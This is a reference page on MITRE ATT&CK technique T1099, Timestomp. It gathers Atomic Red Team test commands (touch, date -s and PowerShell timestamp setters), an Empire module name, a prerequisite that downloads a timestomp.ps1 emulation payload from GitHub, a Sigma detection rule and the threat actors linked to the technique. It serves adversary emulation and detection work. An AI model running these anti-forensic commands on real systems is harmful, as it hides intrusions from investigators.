
# Timestomp

## Description

### MITRE Description

> Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools. Timestomping may be used along with file name [Masquerading](https://attack.mitre.org/techniques/T1036) to hide malware and tools. (Citation: WindowsIR Anti-Forensic Techniques)

## Additional Attributes

* Bypass: ['Host forensic analysis']
* Effective Permissions: None
* Network: intentionally left blank
* Permissions: ['User', 'Administrator', 'SYSTEM']
* Platforms: ['Linux', 'Windows', 'macOS']
* Remote: intentionally left blank
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1099

## Potential Commands

```
touch -a -t 197001010000.00 /opt/filename

touch -m -t 197001010000.00 /opt/filename

NOW=$(date)
date -s "1970-01-01 00:00:00"
touch /opt/filename
date -s "$NOW"
stat /opt/filename

touch -acmr /bin/sh #{target_file_path}

touch -acmr #{reference_file_path} /opt/filename

Get-ChildItem $env:TEMP\T1099_timestomp.txt | % { $_.CreationTime = "#{target_date_time}" }

Get-ChildItem #{file_path} | % { $_.CreationTime = "1970-01-01 00:00:00" }

Get-ChildItem $env:TEMP\T1099_timestomp.txt | % { $_.LastWriteTime = "#{target_date_time}" }

Get-ChildItem #{file_path} | % { $_.LastWriteTime = "1970-01-01 00:00:00" }

Get-ChildItem $env:TEMP\T1099_timestomp.txt | % { $_.LastAccessTime = "#{target_date_time}" }

Get-ChildItem #{file_path} | % { $_.LastAccessTime = "1970-01-01 00:00:00" }

import-module $env:appdata\Microsoft\timestomp.ps1
timestomp -dest "$env:appdata\Microsoft\kxwn.lock"
 

powershell/management/timestomp
powershell/management/timestomp
```

## Commands Dataset

```
[{'command': 'touch -a -t 197001010000.00 /opt/filename\n',
  'name': None,
  'source': 'atomics/T1099/T1099.yaml'},
 {'command': 'touch -m -t 197001010000.00 /opt/filename\n',
  'name': None,
  'source': 'atomics/T1099/T1099.yaml'},
 {'command': 'NOW=$(date)\n'
             'date -s "1970-01-01 00:00:00"\n'
             'touch /opt/filename\n'
             'date -s "$NOW"\n'
             'stat /opt/filename\n',
  'name': None,
  'source': 'atomics/T1099/T1099.yaml'},
 {'command': 'touch -acmr /bin/sh #{target_file_path}\n',
  'name': None,
  'source': 'atomics/T1099/T1099.yaml'},
 {'command': 'touch -acmr #{reference_file_path} /opt/filename\n',
  'name': None,
  'source': 'atomics/T1099/T1099.yaml'},
 {'command': 'Get-ChildItem $env:TEMP\\T1099_timestomp.txt | % { '
             '$_.CreationTime = "#{target_date_time}" }\n',
  'name': None,
  'source': 'atomics/T1099/T1099.yaml'},
 {'command': 'Get-ChildItem #{file_path} | % { $_.CreationTime = "1970-01-01 '
             '00:00:00" }\n',
  'name': None,
  'source': 'atomics/T1099/T1099.yaml'},
 {'command': 'Get-ChildItem $env:TEMP\\T1099_timestomp.txt | % { '
             '$_.LastWriteTime = "#{target_date_time}" }\n',
  'name': None,
  'source': 'atomics/T1099/T1099.yaml'},
 {'command': 'Get-ChildItem #{file_path} | % { $_.LastWriteTime = "1970-01-01 '
             '00:00:00" }\n',
  'name': None,
  'source': 'atomics/T1099/T1099.yaml'},
 {'command': 'Get-ChildItem $env:TEMP\\T1099_timestomp.txt | % { '
             '$_.LastAccessTime = "#{target_date_time}" }\n',
  'name': None,
  'source': 'atomics/T1099/T1099.yaml'},
 {'command': 'Get-ChildItem #{file_path} | % { $_.LastAccessTime = "1970-01-01 '
             '00:00:00" }\n',
  'name': None,
  'source': 'atomics/T1099/T1099.yaml'},
 {'command': 'import-module $env:appdata\\Microsoft\\timestomp.ps1\n'
             'timestomp -dest "$env:appdata\\Microsoft\\kxwn.lock"\n'
             ' \n',
  'name': None,
  'source': 'atomics/T1099/T1099.yaml'},
 {'command': 'powershell/management/timestomp',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/management/timestomp',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'}]
```

## Potential Detections

```json
[{'data_source': {'author': '@neu5ron',
                  'date': '2019/02/05',
                  'description': 'Detect scenarios where a potentially '
                                 'unauthorized application or user is '
                                 'modifying the system time.',
                  'detection': {'condition': 'selection and not ( filter1 or '
                                             'filter2 or filter3 )',
                                'filter1': {'ProcessName': 'C:\\Program '
                                                           'Files\\VMware\\VMware '
                                                           'Tools\\vmtoolsd.exe'},
                                'filter2': {'ProcessName': 'C:\\Windows\\System32\\VBoxService.exe'},
                                'filter3': {'ProcessName': 'C:\\Windows\\System32\\svchost.exe',
                                            'SubjectUserSid': 'S-1-5-19'},
                                'selection': {'EventID': 4616}},
                  'falsepositives': ['HyperV or other virtualization '
                                     'technologies with binary not listed in '
                                     'filter portion of detection'],
                  'id': 'faa031b5-21ed-4e02-8881-2591f98d82ed',
                  'level': 'high',
                  'logsource': {'definition': 'Requirements: Audit Policy : '
                                              'System > Audit Security State '
                                              'Change, Group Policy : Computer '
                                              'Configuration\\Windows '
                                              'Settings\\Security '
                                              'Settings\\Advanced Audit Policy '
                                              'Configuration\\Audit '
                                              'Policies\\System\\Audit '
                                              'Security State Change',
                                'product': 'windows',
                                'service': 'security'},
                  'references': ['Private Cuckoo Sandbox (from many years ago, '
                                 'no longer have hash, NDA as well)',
                                 'Live environment caused by malware'],
                  'status': 'experimental',
                  'tags': ['attack.defense_evasion', 'attack.t1099'],
                  'title': 'Unauthorized System Time Modification'}}]
```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Timestomp': {'atomic_tests': [{'description': 'Stomps '
                                                                        'on '
                                                                        'the '
                                                                        'access '
                                                                        'timestamp '
                                                                        'of a '
                                                                        'file\n',
                                                         'executor': {'command': 'touch '
                                                                                 '-a '
                                                                                 '-t '
                                                                                 '197001010000.00 '
                                                                                 '#{target_filename}\n',
                                                                      'name': 'sh'},
                                                         'input_arguments': {'target_filename': {'default': '/opt/filename',
                                                                                                 'description': 'Path '
                                                                                                                'of '
                                                                                                                'file '
                                                                                                                'that '
                                                                                                                'we '
                                                                                                                'are '
                                                                                                                'going '
                                                                                                                'to '
                                                                                                                'stomp '
                                                                                                                'on '
                                                                                                                'last '
                                                                                                                'access '
                                                                                                                'time',
                                                                                                 'type': 'Path'}},
                                                         'name': "Set a file's "
                                                                 'access '
                                                                 'timestamp',
                                                         'supported_platforms': ['linux',
                                                                                 'macos']},
                                                        {'description': 'Stomps '
                                                                        'on '
                                                                        'the '
                                                                        'modification '
                                                                        'timestamp '
                                                                        'of a '
                                                                        'file\n',
                                                         'executor': {'command': 'touch '
                                                                                 '-m '
                                                                                 '-t '
                                                                                 '197001010000.00 '
                                                                                 '#{target_filename}\n',
                                                                      'name': 'sh'},
                                                         'input_arguments': {'target_filename': {'default': '/opt/filename',
                                                                                                 'description': 'Path '
                                                                                                                'of '
                                                                                                                'file '
                                                                                                                'that '
                                                                                                                'we '
                                                                                                                'are '
                                                                                                                'going '
                                                                                                                'to '
                                                                                                                'stomp '
                                                                                                                'on '
                                                                                                                'last '
                                                                                                                'access '
                                                                                                                'time',
                                                                                                 'type': 'Path'}},
                                                         'name': "Set a file's "
                                                                 'modification '
                                                                 'timestamp',
                                                         'supported_platforms': ['linux',
                                                                                 'macos']},
                                                        {'description': 'Stomps '
                                                                        'on '
                                                                        'the '
                                                                        'create '
                                                                        'timestamp '
                                                                        'of a '
                                                                        'file\n'
                                                                        '\n'
                                                                        'Setting '
                                                                        'the '
                                                                        'creation '
                                                                        'timestamp '
                                                                        'requires '
                                                                        'changing '
                                                                        'the '
                                                                        'system '
                                                                        'clock '
                                                                        'and '
                                                                        'reverting.\n'
                                                                        'Sudo '
                                                                        'or '
                                                                        'root '
                                                                        'privileges '
                                                                        'are '
                                                                        'required '
                                                                        'to '
                                                                        'change '
                                                                        'date. '
                                                                        'Use '
                                                                        'with '
                                                                        'caution.\n',
                                                         'executor': {'command': 'NOW=$(date)\n'
                                                                                 'date '
                                                                                 '-s '
                                                                                 '"1970-01-01 '
                                                                                 '00:00:00"\n'
                                                                                 'touch '
                                                                                 '#{target_filename}\n'
                                                                                 'date '
                                                                                 '-s '
                                                                                 '"$NOW"\n'
                                                                                 'stat '
                                                                                 '#{target_filename}\n',
                                                                      'name': 'sh'},
                                                         'input_arguments': {'target_filename': {'default': '/opt/filename',
                                                                                                 'description': 'Path '
                                                                                                                'of '
                                                                                                                'file '
                                                                                                                'that '
                                                                                                                'we '
                                                                                                                'are '
                                                                                                                'going '
                                                                                                                'to '
                                                                                                                'stomp '
                                                                                                                'on '
                                                                                                                'last '
                                                                                                                'access '
                                                                                                                'time',
                                                                                                 'type': 'Path'}},
                                                         'name': "Set a file's "
                                                                 'creation '
                                                                 'timestamp',
                                                         'supported_platforms': ['linux',
                                                                                 'macos']},
                                                        {'description': 'Modifies '
                                                                        'the '
                                                                        '`modify` '
                                                                        'and '
                                                                        '`access` '
                                                                        'timestamps '
                                                                        'using '
                                                                        'the '
                                                                        'timestamps '
                                                                        'of a '
                                                                        'specified '
                                                                        'reference '
                                                                        'file.\n'
                                                                        '\n'
                                                                        'This '
                                                                        'technique '
                                                                        'was '
                                                                        'used '
                                                                        'by '
                                                                        'the '
                                                                        'threat '
                                                                        'actor '
                                                                        'Rocke '
                                                                        'during '
                                                                        'the '
                                                                        'compromise '
                                                                        'of '
                                                                        'Linux '
                                                                        'web '
                                                                        'servers.\n',
                                                         'executor': {'command': 'touch '
                                                                                 '-acmr '
                                                                                 '#{reference_file_path} '
                                                                                 '#{target_file_path}\n',
                                                                      'name': 'sh'},
                                                         'input_arguments': {'reference_file_path': {'default': '/bin/sh',
                                                                                                     'description': 'Path '
                                                                                                                    'of '
                                                                                                                    'reference '
                                                                                                                    'file '
                                                                                                                    'to '
                                                                                                                    'read '
                                                                                                                    'timestamps '
                                                                                                                    'from',
                                                                                                     'type': 'Path'},
                                                                             'target_file_path': {'default': '/opt/filename',
                                                                                                  'description': 'Path '
                                                                                                                 'of '
                                                                                                                 'file '
                                                                                                                 'to '
                                                                                                                 'modify '
                                                                                                                 'timestamps '
                                                                                                                 'of',
                                                                                                  'type': 'Path'}},
                                                         'name': 'Modify file '
                                                                 'timestamps '
                                                                 'using '
                                                                 'reference '
                                                                 'file',
                                                         'supported_platforms': ['linux',
                                                                                 'macos']},
                                                        {'dependencies': [{'description': 'A '
                                                                                          'file '
                                                                                          'must '
                                                                                          'exist '
                                                                                          'at '
                                                                                          'the '
                                                                                          'path '
                                                                                          '(#{file_path}) '
                                                                                          'to '
                                                                                          'change '
                                                                                          'the '
                                                                                          'creation '
                                                                                          'time '
                                                                                          'on\n',
                                                                           'get_prereq_command': 'New-Item '
                                                                                                 '-Path '
                                                                                                 '#{file_path} '
                                                                                                 '-Force '
                                                                                                 '| '
                                                                                                 'Out-Null\n'
                                                                                                 'Set-Content '
                                                                                                 '#{file_path} '
                                                                                                 '-Value '
                                                                                                 '"T1099 '
                                                                                                 'Timestomp" '
                                                                                                 '-Force '
                                                                                                 '| '
                                                                                                 'Out-Null\n',
                                                                           'prereq_command': 'if '
                                                                                             '(Test-Path '
                                                                                             '#{file_path}) '
                                                                                             '{exit '
                                                                                             '0} '
                                                                                             'else '
                                                                                             '{exit '
                                                                                             '1}\n'}],
                                                         'dependency_executor_name': 'powershell',
                                                         'description': 'Modifies '
                                                                        'the '
                                                                        'file '
                                                                        'creation '
                                                                        'timestamp '
                                                                        'of a '
                                                                        'specified '
                                                                        'file. '
                                                                        'This '
                                                                        'technique '
                                                                        'was '
                                                                        'seen '
                                                                        'in '
                                                                        'use '
                                                                        'by '
                                                                        'the '
                                                                        'Stitch '
                                                                        'RAT.\n'
                                                                        'To '
                                                                        'verify '
                                                                        'execution, '
                                                                        'use '
                                                                        'File '
                                                                        'Explorer '
                                                                        'to '
                                                                        'view '
                                                                        'the '
                                                                        'Properties '
                                                                        'of '
                                                                        'the '
                                                                        'file '
                                                                        'and '
                                                                        'observe '
                                                                        'that '
                                                                        'the '
                                                                        'Created '
                                                                        'time '
                                                                        'is '
                                                                        'the '
                                                                        'year '
                                                                        '1970.\n',
                                                         'executor': {'cleanup_command': 'Remove-Item '
                                                                                         '#{file_path} '
                                                                                         '-Force '
                                                                                         '-ErrorAction '
                                                                                         'Ignore\n',
                                                                      'command': 'Get-ChildItem '
                                                                                 '#{file_path} '
                                                                                 '| '
                                                                                 '% '
                                                                                 '{ '
                                                                                 '$_.CreationTime '
                                                                                 '= '
                                                                                 '"#{target_date_time}" '
                                                                                 '}\n',
                                                                      'elevation_required': False,
                                                                      'name': 'powershell'},
                                                         'input_arguments': {'file_path': {'default': '$env:TEMP\\T1099_timestomp.txt',
                                                                                           'description': 'Path '
                                                                                                          'of '
                                                                                                          'file '
                                                                                                          'to '
                                                                                                          'change '
                                                                                                          'creation '
                                                                                                          'timestamp',
                                                                                           'type': 'Path'},
                                                                             'target_date_time': {'default': '1970-01-01 '
                                                                                                             '00:00:00',
                                                                                                  'description': 'Date/time '
                                                                                                                 'to '
                                                                                                                 'replace '
                                                                                                                 'original '
                                                                                                                 'timestamps '
                                                                                                                 'with',
                                                                                                  'type': 'String'}},
                                                         'name': 'Windows - '
                                                                 'Modify file '
                                                                 'creation '
                                                                 'timestamp '
                                                                 'with '
                                                                 'PowerShell',
                                                         'supported_platforms': ['windows']},
                                                        {'dependencies': [{'description': 'A '
                                                                                          'file '
                                                                                          'must '
                                                                                          'exist '
                                                                                          'at '
                                                                                          'the '
                                                                                          'path '
                                                                                          '(#{file_path}) '
                                                                                          'to '
                                                                                          'change '
                                                                                          'the '
                                                                                          'modified '
                                                                                          'time '
                                                                                          'on\n',
                                                                           'get_prereq_command': 'New-Item '
                                                                                                 '-Path '
                                                                                                 '#{file_path} '
                                                                                                 '-Force '
                                                                                                 '| '
                                                                                                 'Out-Null\n'
                                                                                                 'Set-Content '
                                                                                                 '#{file_path} '
                                                                                                 '-Value '
                                                                                                 '"T1099 '
                                                                                                 'Timestomp" '
                                                                                                 '-Force '
                                                                                                 '| '
                                                                                                 'Out-Null\n',
                                                                           'prereq_command': 'if '
                                                                                             '(Test-Path '
                                                                                             '#{file_path}) '
                                                                                             '{exit '
                                                                                             '0} '
                                                                                             'else '
                                                                                             '{exit '
                                                                                             '1}\n'}],
                                                         'dependency_executor_name': 'powershell',
                                                         'description': 'Modifies '
                                                                        'the '
                                                                        'file '
                                                                        'last '
                                                                        'modified '
                                                                        'timestamp '
                                                                        'of a '
                                                                        'specified '
                                                                        'file. '
                                                                        'This '
                                                                        'technique '
                                                                        'was '
                                                                        'seen '
                                                                        'in '
                                                                        'use '
                                                                        'by '
                                                                        'the '
                                                                        'Stitch '
                                                                        'RAT.\n'
                                                                        'To '
                                                                        'verify '
                                                                        'execution, '
                                                                        'use '
                                                                        'File '
                                                                        'Explorer '
                                                                        'to '
                                                                        'view '
                                                                        'the '
                                                                        'Properties '
                                                                        'of '
                                                                        'the '
                                                                        'file '
                                                                        'and '
                                                                        'observe '
                                                                        'that '
                                                                        'the '
                                                                        'Modified '
                                                                        'time '
                                                                        'is '
                                                                        'the '
                                                                        'year '
                                                                        '1970.\n',
                                                         'executor': {'cleanup_command': 'Remove-Item '
                                                                                         '#{file_path} '
                                                                                         '-Force '
                                                                                         '-ErrorAction '
                                                                                         'Ignore\n',
                                                                      'command': 'Get-ChildItem '
                                                                                 '#{file_path} '
                                                                                 '| '
                                                                                 '% '
                                                                                 '{ '
                                                                                 '$_.LastWriteTime '
                                                                                 '= '
                                                                                 '"#{target_date_time}" '
                                                                                 '}\n',
                                                                      'elevation_required': False,
                                                                      'name': 'powershell'},
                                                         'input_arguments': {'file_path': {'default': '$env:TEMP\\T1099_timestomp.txt',
                                                                                           'description': 'Path '
                                                                                                          'of '
                                                                                                          'file '
                                                                                                          'to '
                                                                                                          'change '
                                                                                                          'modified '
                                                                                                          'timestamp',
                                                                                           'type': 'Path'},
                                                                             'target_date_time': {'default': '1970-01-01 '
                                                                                                             '00:00:00',
                                                                                                  'description': 'Date/time '
                                                                                                                 'to '
                                                                                                                 'replace '
                                                                                                                 'original '
                                                                                                                 'timestamps '
                                                                                                                 'with',
                                                                                                  'type': 'String'}},
                                                         'name': 'Windows - '
                                                                 'Modify file '
                                                                 'last '
                                                                 'modified '
                                                                 'timestamp '
                                                                 'with '
                                                                 'PowerShell',
                                                         'supported_platforms': ['windows']},
                                                        {'dependencies': [{'description': 'A '
                                                                                          'file '
                                                                                          'must '
                                                                                          'exist '
                                                                                          'at '
                                                                                          'the '
                                                                                          'path '
                                                                                          '(#{file_path}) '
                                                                                          'to '
                                                                                          'change '
                                                                                          'the '
                                                                                          'last '
                                                                                          'access '
                                                                                          'time '
                                                                                          'on\n',
                                                                           'get_prereq_command': 'New-Item '
                                                                                                 '-Path '
                                                                                                 '#{file_path} '
                                                                                                 '-Force '
                                                                                                 '| '
                                                                                                 'Out-Null\n'
                                                                                                 'Set-Content '
                                                                                                 '#{file_path} '
                                                                                                 '-Value '
                                                                                                 '"T1099 '
                                                                                                 'Timestomp" '
                                                                                                 '-Force '
                                                                                                 '| '
                                                                                                 'Out-Null\n',
                                                                           'prereq_command': 'if '
                                                                                             '(Test-Path '
                                                                                             '#{file_path}) '
                                                                                             '{exit '
                                                                                             '0} '
                                                                                             'else '
                                                                                             '{exit '
                                                                                             '1}\n'}],
                                                         'dependency_executor_name': 'powershell',
                                                         'description': 'Modifies '
                                                                        'the '
                                                                        'last '
                                                                        'access '
                                                                        'timestamp '
                                                                        'of a '
                                                                        'specified '
                                                                        'file. '
                                                                        'This '
                                                                        'technique '
                                                                        'was '
                                                                        'seen '
                                                                        'in '
                                                                        'use '
                                                                        'by '
                                                                        'the '
                                                                        'Stitch '
                                                                        'RAT.\n'
                                                                        'To '
                                                                        'verify '
                                                                        'execution, '
                                                                        'use '
                                                                        'File '
                                                                        'Explorer '
                                                                        'to '
                                                                        'view '
                                                                        'the '
                                                                        'Properties '
                                                                        'of '
                                                                        'the '
                                                                        'file '
                                                                        'and '
                                                                        'observe '
                                                                        'that '
                                                                        'the '
                                                                        'Accessed '
                                                                        'time '
                                                                        'is '
                                                                        'the '
                                                                        'year '
                                                                        '1970.\n',
                                                         'executor': {'cleanup_command': 'Remove-Item '
                                                                                         '#{file_path} '
                                                                                         '-Force '
                                                                                         '-ErrorAction '
                                                                                         'Ignore\n',
                                                                      'command': 'Get-ChildItem '
                                                                                 '#{file_path} '
                                                                                 '| '
                                                                                 '% '
                                                                                 '{ '
                                                                                 '$_.LastAccessTime '
                                                                                 '= '
                                                                                 '"#{target_date_time}" '
                                                                                 '}\n',
                                                                      'elevation_required': False,
                                                                      'name': 'powershell'},
                                                         'input_arguments': {'file_path': {'default': '$env:TEMP\\T1099_timestomp.txt',
                                                                                           'description': 'Path '
                                                                                                          'of '
                                                                                                          'file '
                                                                                                          'to '
                                                                                                          'change '
                                                                                                          'last '
                                                                                                          'access '
                                                                                                          'timestamp',
                                                                                           'type': 'Path'},
                                                                             'target_date_time': {'default': '1970-01-01 '
                                                                                                             '00:00:00',
                                                                                                  'description': 'Date/time '
                                                                                                                 'to '
                                                                                                                 'replace '
                                                                                                                 'original '
                                                                                                                 'timestamps '
                                                                                                                 'with',
                                                                                                  'type': 'String'}},
                                                         'name': 'Windows - '
                                                                 'Modify file '
                                                                 'last access '
                                                                 'timestamp '
                                                                 'with '
                                                                 'PowerShell',
                                                         'supported_platforms': ['windows']},
                                                        {'dependencies': [{'description': 'timestomp.ps1 '
                                                                                          'must '
                                                                                          'be '
                                                                                          'present '
                                                                                          'in '
                                                                                          '#{file_path}.\n',
                                                                           'get_prereq_command': 'Invoke-WebRequest '
                                                                                                 '"https://raw.githubusercontent.com/mitre-attack/attack-arsenal/bc0ba1d88d026396939b6816de608cb279bfd489/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/timestomp.ps1" '
                                                                                                 '-OutFile '
                                                                                                 '"#{file_path}\\timestomp.ps1"\n',
                                                                           'prereq_command': 'if '
                                                                                             '(Test-Path '
                                                                                             '#{file_path}\\timestomp.ps1) '
                                                                                             '{exit '
                                                                                             '0} '
                                                                                             'else '
                                                                                             '{exit '
                                                                                             '1}\n'},
                                                                          {'description': 'kxwn.lock '
                                                                                          'must '
                                                                                          'be '
                                                                                          'present '
                                                                                          'in '
                                                                                          '#{file_path}.\n',
                                                                           'get_prereq_command': 'New-Item '
                                                                                                 '-Path '
                                                                                                 '#{file_path}\\kxwn.lock '
                                                                                                 '-ItemType '
                                                                                                 'File\n',
                                                                           'prereq_command': 'if '
                                                                                             '(Test-Path '
                                                                                             '-path '
                                                                                             '"#{file_path}\\kxwn.lock") '
                                                                                             '{exit '
                                                                                             '0} '
                                                                                             'else '
                                                                                             '{exit '
                                                                                             '1}\n'}],
                                                         'dependency_executor_name': 'powershell',
                                                         'description': 'Timestomp '
                                                                        'kxwn.lock.\n'
                                                                        '\n'
                                                                        'Successful '
                                                                        'execution '
                                                                        'will '
                                                                        'include '
                                                                        'the '
                                                                        'placement '
                                                                        'of '
                                                                        'kxwn.lock '
                                                                        'in '
                                                                        '#{file_path} '
                                                                        'and '
                                                                        'execution '
                                                                        'of '
                                                                        'timestomp.ps1 '
                                                                        'to '
                                                                        'modify '
                                                                        'the '
                                                                        'time '
                                                                        'of '
                                                                        'the '
                                                                        '.lock '
                                                                        'file. \n'
                                                                        '\n'
                                                                        '[Mitre '
                                                                        'ATT&CK '
                                                                        'Evals](https://github.com/mitre-attack/attack-arsenal/blob/master/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/defensive-evasion/4a2ad84e-a93a-4b2e-b1f0-c354d6a41278.yml)\n',
                                                         'executor': {'cleanup_command': 'Write-Host '
                                                                                         '"Removing '
                                                                                         '#{file_path}\\timestomp.ps1"\n'
                                                                                         'Remove-Item '
                                                                                         '#{file_path}\\timestomp.ps1 '
                                                                                         '-ErrorAction '
                                                                                         'Ignore\n'
                                                                                         'Write-Host '
                                                                                         '"Removing '
                                                                                         '#{file_path}\\kxwn.lock"\n'
                                                                                         'Remove-Item '
                                                                                         '#{file_path}\\kxwn.lock '
                                                                                         '-ErrorAction '
                                                                                         'Ignore',
                                                                      'command': 'import-module '
                                                                                 '#{file_path}\\timestomp.ps1\n'
                                                                                 'timestomp '
                                                                                 '-dest '
                                                                                 '"#{file_path}\\kxwn.lock"\n'
                                                                                 ' \n',
                                                                      'elevation_required': False,
                                                                      'name': 'powershell'},
                                                         'input_arguments': {'file_path': {'default': '$env:appdata\\Microsoft',
                                                                                           'description': 'File '
                                                                                                          'path '
                                                                                                          'for '
                                                                                                          'timestomp '
                                                                                                          'payload',
                                                                                           'type': 'String'}},
                                                         'name': 'Windows - '
                                                                 'Timestomp a '
                                                                 'File',
                                                         'supported_platforms': ['windows']}],
                                       'attack_technique': 'T1099',
                                       'display_name': 'Timestomp'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1099',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/management/timestomp":  '
                                                                                 '["T1099"],',
                                            'Empire Module': 'powershell/management/timestomp',
                                            'Technique': 'Timestomp'}}]
```

# Tactics


* [Defense Evasion](../tactics/Defense-Evasion.md)


# Mitigations

None

# Actors


* [APT28](../actors/APT28.md)

* [APT32](../actors/APT32.md)
    
* [Lazarus Group](../actors/Lazarus-Group.md)
    
* [TEMP.Veles](../actors/TEMP.Veles.md)
    
